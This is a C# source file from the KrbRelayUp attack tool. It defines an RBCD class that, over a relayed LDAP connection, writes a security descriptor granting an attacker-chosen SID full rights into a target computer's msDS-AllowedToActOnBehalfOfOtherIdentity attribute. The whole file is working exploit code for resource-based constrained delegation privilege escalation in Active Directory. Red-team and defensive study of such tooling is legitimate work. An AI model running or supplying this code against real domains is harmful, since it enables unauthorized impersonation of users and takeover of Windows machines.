using System;
using System.Security.AccessControl;
using static KrbRelayUp.Relay.Natives;

namespace KrbRelayUp.Relay.Attacks.Ldap
{
    internal class RBCD
    {
        public static LdapStatus attack(IntPtr ld, string sid, string computername = null)
        {
            if (!sid.StartsWith("S-1-5-"))
            {
                sid = Generic.getPropertyValue(ld, sid, "objectSid");
            }
            string dn = Generic.getMachineDN(ld, computername);
            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")";
            RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
            byte[] value = new byte[sd.BinaryLength];
            sd.GetBinaryForm(value, 0);
            return Generic.setAttribute(ld, "msDS-AllowedToActOnBehalfOfOtherIdentity", value, dn);
        }
    }
}
